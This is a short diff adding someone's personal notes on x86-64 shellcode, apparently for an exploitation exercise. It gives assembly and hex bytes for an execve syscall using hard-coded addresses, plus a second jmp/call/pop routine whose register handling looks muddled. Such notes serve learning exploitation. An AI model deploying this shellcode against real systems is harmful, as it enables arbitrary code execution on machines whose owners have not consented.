@@ -1,0 +1,34 @@
+My shellcode:
+Assembly:
+
+I have to execute the syscall execve()
+we have to write 0x3b
+
+
+mov rax, 0x3b
+mov rdi, 0x601148
+mov rsi, 0x601150
+mov rdx, 0x601150
+syscall 
+
+
+shellcode:
+\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x48\x11\x60\x00\x48\xC7\xC6\x50\x11\x60\x00\x48\xC7\xC2\x50\x11\x60\x00\x0F\x05
+
+
+
+Second shellcode:
+
+jmp endshellcode
+shellcode:
+pop rdi
+xor rsi, rsi
+mov rsi,rdi
+add rsi, 8
+mov rdi, rsi
+mov rax, 0x3b
+syscall 
+
+endshellcode:
+call shellcode
+nop
